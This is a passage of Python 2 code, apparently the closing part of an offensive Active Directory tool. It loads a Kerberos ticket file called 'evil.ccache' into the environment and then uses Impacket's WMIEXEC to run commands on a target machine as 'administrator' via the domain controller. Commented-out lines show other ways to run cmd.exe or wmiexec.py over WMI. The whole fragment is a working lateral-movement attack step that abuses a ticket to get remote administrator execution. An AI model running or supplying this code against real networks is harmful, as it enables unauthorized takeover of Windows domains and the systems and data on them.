    print '[*] loading ticket into environment'
    cwd = os.getcwd()
    ticket_location = "%s/evil.ccache" % (cwd)
    os.chmod(ticket_location, 0700)
    os.environ['KRB5CCNAME'] = ticket_location

    # command = 'cmd.exe /Q /c %s' % options.command
    # print '[*] executing "%s" over wmi' % command
    # wmi_exec(options.target, options.dc, command)

    #os.system('./wmiexec.py -no-pass -k administrator@%s -dc-ip %s' % (options.target, options.dc))
    #
    executer = WMIEXEC(' ', 'administrator', '', options.domain, None,'',
                       'ADMIN$', False, True, options.dc)
    executer.run(options.target)




    print "[+] complete"